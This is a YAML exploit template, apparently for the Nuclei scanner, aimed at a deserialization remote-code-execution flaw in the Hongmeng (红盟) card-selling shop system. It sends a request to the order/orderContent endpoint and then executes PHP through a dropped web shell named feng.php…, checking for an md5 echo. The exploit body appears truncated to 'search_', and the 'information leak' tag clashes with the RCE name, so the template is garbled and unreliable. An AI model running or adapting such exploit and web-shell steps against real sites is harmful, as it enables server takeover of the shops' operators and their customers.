id: poc-yaml-hm-faka-ordercontent-unserialize-rce
info:
  name: 红盟发卡系统 order/orderContent 反序列化漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 信息泄露
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        POST /shop/order/orderContent?order_no=123 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        search_
    matchers-condition: and
    matchers:
      - type: status
        status: [500]
      - type: word
        words:
          - "System Error"
        part: title
  - raw:
      - |
        POST /feng.php3b58a9545013e88c7186db11bb158c44.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        feng=echo%20md5({{t1}});
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "{{t2}}"
        part: body
